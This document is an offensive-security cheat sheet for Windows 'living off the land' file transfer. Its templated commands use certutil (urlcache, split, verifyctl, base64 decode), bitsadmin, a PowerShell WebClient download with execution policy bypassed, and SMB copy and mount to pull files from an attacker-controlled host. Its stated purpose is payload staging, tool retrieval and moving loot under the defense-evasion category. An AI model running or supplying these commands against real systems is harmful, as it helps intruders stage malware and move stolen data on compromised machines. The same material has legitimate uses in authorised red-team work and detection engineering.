---
technique: Windows File Transfer LOLBins
category: defense-evasion
targets: Windows Workstation, Windows Server
protocols: HTTP, SMB
remote_capable: true
tags: windows lolbin file-transfer certutil bitsadmin powershell smb
---

# Windows File Transfer LOLBins

Native Windows binaries and PowerShell can transfer files without third-party tools. These commands are useful for payload staging, tool retrieval, and moving loot when standard tooling is unavailable.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Listener | Host files over HTTP or SMB before pulling from the target |
| Egress | The target must reach the listener over the selected protocol |
| Write path | Choose an output directory writable by the current user |

## Windows

### certutil download

#cmd #certutil #download

Download a small file through certutil URL cache.

```cmd title:"Download file with certutil URL cache"
certutil -urlcache -f "$scheme://$lhost:$lport/$file" "$output_path"
```
<!-- cheat
var scheme
var lhost
var lport
var file
var output_path
-->

### certutil split download

#cmd #certutil #download

Download a larger file through certutil split mode.

```cmd title:"Download large file with certutil split mode"
certutil -urlcache -split -f "$scheme://$lhost:$lport/$file" "$output_path"
```
<!-- cheat
var scheme
var lhost
var lport
var file
var output_path
-->

### certutil verifyctl download

#cmd #certutil #download

Download through certutil `-verifyctl` mode.

```cmd title:"Download file with certutil verifyctl"
certutil.exe -verifyctl -f -split "$scheme://$lhost:$lport/$file" "$output_path"
```
<!-- cheat
var scheme
var lhost
var lport
var file
var output_path
-->

### certutil decode

#cmd #certutil #decode

Decode a base64 file.

```cmd title:"Decode base64 file with certutil"
certutil.exe -decode "$encoded_file" "$output_file"
```
<!-- cheat
var encoded_file
var output_file
-->

### bitsadmin download

#cmd #bitsadmin #download

Download a file through BITS.

```cmd title:"Download file with bitsadmin"
bitsadmin /transfer job "$scheme://$lhost:$lport/$file" "$output_path"
```
<!-- cheat
var scheme
var lhost
var lport
var file
var output_path
-->

### PowerShell download

#powershell #download

Download a file with PowerShell WebClient.

```powershell title:"Download file with PowerShell WebClient"
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -Command "(New-Object System.Net.WebClient).DownloadFile('$scheme://$lhost:$lport/$file', '$output_path')"
```
<!-- cheat
var scheme
var lhost
var lport
var file
var output_path
-->

### SMB copy

#cmd #smb

Copy a file from an attacker-controlled SMB share.

```cmd title:"Copy file from SMB share"
copy "\\$lhost\$share\$file" "$output_path"
```
<!-- cheat
var lhost
var share
var file
var output_path
-->

### Mount SMB share

#cmd #smb

Mount an SMB share to a drive letter for multiple file transfers.

```cmd title:"Mount SMB share to drive letter"
net use n: "\\$lhost\$share"
```
<!-- cheat
var lhost
var share
-->

## Linux

No Linux operator command is included here. This note covers Windows-native transfer commands.
